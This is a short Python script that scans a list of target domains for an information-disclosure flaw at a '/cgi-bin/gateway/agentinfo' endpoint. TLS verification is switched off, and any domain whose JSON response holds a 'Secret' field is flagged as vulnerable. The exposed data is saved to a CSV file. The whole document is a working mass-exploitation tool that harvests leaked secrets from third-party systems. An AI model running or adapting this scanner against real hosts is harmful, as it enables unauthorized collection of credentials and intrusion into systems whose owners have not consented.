import csv
import requests


domains = []
with open('target.txt') as f:
  domains = f.readlines()

rows = []
for domain in domains:
  domain = domain.strip()
  
  try:
    url = domain + "/cgi-bin/gateway/agentinfo"
    print(f"Requesting: {url}")
    
    response = requests.get(url, verify=False)
    data = response.json()
    
    if 'Secret' in data:
      print(f"{domain} exists vulnerability")
      rows.append([domain, data]) 
    else:
      print(f"{domain} not exists vulnerability")
      rows.append([domain, "Not Exists"])
      
  except Exception as e:
    print(f"Request {domain} error: {e}")
    
with open('result.csv', 'w', newline='') as f:
  writer = csv.writer(f)
  writer.writerows(rows)
  
print("Finished.")